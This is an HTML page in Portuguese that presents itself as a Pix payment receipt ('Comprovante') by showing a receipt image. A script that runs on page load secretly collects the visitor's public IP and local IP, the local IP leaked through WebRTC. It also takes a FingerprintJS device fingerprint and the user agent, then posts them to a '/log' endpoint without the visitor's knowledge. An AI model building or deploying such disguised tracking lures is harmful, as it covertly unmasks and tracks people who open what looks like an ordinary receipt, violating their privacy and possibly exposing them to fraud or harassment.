<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Comprovante</title>
  <style>
    body { background: #fff; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix" />

  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    window.onload = async function rastrear() {
      console.log("üü° Script carregado... iniciando rastreamento");
  
      try {
        const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
  
        let localIP = "N/A";
        pc.onicecandidate = event => {
          if (event && event.candidate) {
            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
            if (match) localIP = match[1];
          }
        };
  
        const fp = await FingerprintJS.load();
        const result = await fp.get();
  
        const data = {
          ip: ipData.ip,
          localIP,
          visitorId: result.visitorId,
          userAgent: navigator.userAgent,
          device: `${navigator.platform} - ${navigator.userAgent}`
        };
  
        console.log("üì¶ Payload:", data);
  
        await fetch("/log", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
  
        console.log("‚úÖ Enviado");
      } catch (err) {
        console.error("‚ùå Erro no rastreamento", err);
      }
    };
  </script>
  
  
</body>
</html>
